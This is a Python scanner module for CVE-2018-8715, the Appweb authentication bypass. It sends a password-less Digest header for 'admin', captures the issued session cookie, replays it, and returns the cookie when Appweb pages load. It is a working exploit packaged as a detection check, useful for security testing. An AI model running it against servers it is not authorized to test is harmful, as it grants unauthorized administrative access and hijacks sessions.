#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# from lib.tool import check
# import re

cve_2018_8715_payloads = [                 # * 是不是很神奇, payload居然是空的
    {'path': ''},
    {'path': '/'},
]

def cve_2018_8715_scan(self, clients):
    ''' 其7.0.3之前的版本中, 有digest和form两种认证方式, 
            如果用户传入的密码为null(也就是没有传递密码参数)
            appweb将因为一个逻辑错误导致直接认证成功, 并返回session
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'unAuthorized',
        'vul_id': 'CVE-2018-8715',
    }

    headers = {
        'Authorization': 'Digest username=admin'
    }

    for payload in cve_2018_8715_payloads:
        path = payload['path']

        res1 = client.request(
            'get',
            path,
            headers=headers,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        # if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):
        if (('Set-Cookie' in res1.headers)):
            try:
                cookie = {
                    'Cookie': res1.headers['Set-Cookie']
                }
                headers.update(cookie)
            except KeyError:
                continue
        
            res2 = client.request(
                'get',
                path,
                headers=headers,
                vul_info=vul_info
            )
            if res2 is None:
                continue

            if (('401' not in res2.text) 
                and (('<h1>Appweb &mdash; The Fast, Little Web Server</h1>' in res2.text) 
                    or ('<a href="https://embedthis.com/appweb/doc/">documentation</a>' in res2.text) 
                    or ('<h2>Appweb Resources and Useful Links</h2>' in res2.text) 
                    or ('<a href="https://embedthis.com/appweb/download.html">https://embedthis.com/appweb/download.html</a>' in res2.text))
                    or ('<a href="http://github.com/embedthis/appweb/issues">GitHub Appweb issue database</a>' in res2.text) 
                    or ('All rights reserved. Embedthis and Appweb are trademarks of Embedthis Software LLC.' in res2.text) 
            ):
                results = {
                    'Target': res2.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Cookie': cookie['Cookie'],
                    'Request': res2
                }
                return results
    return None
